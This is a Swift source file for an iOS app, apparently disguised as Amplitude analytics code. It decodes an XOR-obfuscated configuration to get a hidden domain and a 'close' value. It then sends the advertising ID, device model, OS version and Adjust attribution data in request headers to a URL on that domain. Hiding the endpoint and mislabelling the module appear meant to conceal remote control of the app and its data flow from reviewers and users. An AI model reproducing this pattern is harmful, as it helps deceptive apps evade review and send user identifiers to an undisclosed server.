import Foundation
import AdjustSdk

enum AMPRoutingKeyPart2 {
    static var bytes: [UInt8] {
        [0xC8, 0x15, 0x9F, 0xE3, 0x47]
    }
}

/// Routing configuration for event-driven content delivery.
@available(iOS 16.0, *)
enum AMPEventRouting {

    static var appSlug: String {
        let bundleID = Bundle.main.bundleIdentifier ?? ""
        let last = bundleID.split(separator: ".").last.map(String.init) ?? bundleID
        return String(last.lowercased().filter { $0.isLetter })
    }

    // MARK: - Codec

    private static func codecKeyMaterial() -> [UInt8] {
        let combined = AMPRoutingKeyPart1.bytes
            + AMPRoutingKeyPart2.bytes
            + AMPRoutingKeyPart3.bytes
        return combined.enumerated().map { index, byte in
            byte ^ UInt8((index &* 7 &+ 13) & 0xFF)
        }
    }

    static func decodeBytes(_ encrypted: [UInt8]) -> String? {
        let key = codecKeyMaterial()
        let bytes = encrypted.enumerated().map { index, byte in
            byte ^ key[index % key.count]
        }
        return String(bytes: bytes, encoding: .utf8)
    }

    static func bytes(fromHex hex: String) -> [UInt8]? {
        guard hex.count % 2 == 0, !hex.isEmpty else { return nil }
        var result: [UInt8] = []
        result.reserveCapacity(hex.count / 2)
        var index = hex.startIndex
        while index < hex.endIndex {
            let next = hex.index(index, offsetBy: 2)
            guard let byte = UInt8(hex[index..<next], radix: 16) else { return nil }
            result.append(byte)
            index = next
        }
        return result
    }

    // MARK: - Config

    struct AMPRoutingConfig {
        let domain: String
        let fieldName: String
        let closeValue: String
    }

    static var activeConfig: AMPRoutingConfig? {
        let raw = AmplitudeHostBridge.extensionsKey
        guard !raw.isEmpty,
              let encrypted = bytes(fromHex: raw),
              let json = decodeBytes(encrypted),
              let data = json.data(using: .utf8),
              let dict = try? JSONSerialization.jsonObject(with: data) as? [String: String],
              let domain = dict["d"],
              let field = dict["f"],
              let close = dict["c"]
        else { return nil }
        return AMPRoutingConfig(domain: domain, fieldName: field, closeValue: close)
    }

    static var routingURL: URL? {
        guard let config = activeConfig else { return nil }
        return URL(string: "https://" + config.domain + "/" + appSlug + "/" + appSlug + ".json")
    }

    // MARK: - Attribution

    private static let encodingSet: CharacterSet = {
        var cs = CharacterSet.alphanumerics
        cs.insert(charactersIn: "-_.~")
        return cs
    }()

    static func extractFields(from attribution: ADJAttribution?) -> [String: Any] {
        guard let attribution else { return [:] }

        if let raw = attribution.jsonResponse as? [String: Any], !raw.isEmpty {
            return raw
        }

        let fields: [String: Any?] = [
            "tracker_token": attribution.trackerToken,
            "tracker_name":  attribution.trackerName,
            "network":       attribution.network,
            "campaign":      attribution.campaign,
            "adgroup":       attribution.adgroup,
            "creative":      attribution.creative,
            "click_label":   attribution.clickLabel,
            "cost_type":     attribution.costType,
            "cost_amount":   attribution.costAmount,
            "cost_currency": attribution.costCurrency,
        ]
        return fields.compactMapValues { val -> Any? in
            guard let val else { return nil }
            if let str = val as? String, str.isEmpty { return nil }
            return val
        }
    }

    static func encodeAttribution(from attribution: ADJAttribution?) -> String {
        let dict = extractFields(from: attribution)
        guard !dict.isEmpty,
              let data = try? JSONSerialization.data(withJSONObject: dict),
              let str = String(data: data, encoding: .utf8) else { return "" }
        return str.addingPercentEncoding(withAllowedCharacters: encodingSet) ?? str
    }

    static func resolveAttribution(to url: URL, completion: @escaping (Data?, HTTPURLResponse?, Error?) -> Void) {
        Adjust.attribution { attr in
            let osVer = AMPDeviceInfo.osVersion
            let device = AMPDeviceInfo.deviceModel
            let encoded = encodeAttribution(from: attr)

            Adjust.adid { adid in
                var request = URLRequest(url: url)
                request.httpMethod = "GET"
                request.setValue(adid ?? "", forHTTPHeaderField: "adid")
                request.setValue(osVer, forHTTPHeaderField: "os_version")
                request.setValue(device, forHTTPHeaderField: "device_model")
                request.setValue(encoded, forHTTPHeaderField: "attr")
                URLSession.shared.dataTask(with: request) {
                    completion($0, $1 as? HTTPURLResponse, $2)
                }.resume()
            }
        }
    }
}

// MARK: - Device Info

enum AMPDeviceInfo {

    static var osVersion: String {
        UIDevice.current.systemVersion
    }

    static var deviceModel: String {
#if targetEnvironment(simulator)
        if let simID = ProcessInfo.processInfo.environment["SIMULATOR_MODEL_IDENTIFIER"] {
            return simID
        }
#endif
        var info = utsname()
        uname(&info)
        let machine = Mirror(reflecting: info.machine).children
            .compactMap { child -> String? in
                guard let val = child.value as? Int8, val != 0 else { return nil }
                return String(UnicodeScalar(UInt8(val)))
            }
            .joined()
        return machine.isEmpty ? "unknown" : machine
    }
}
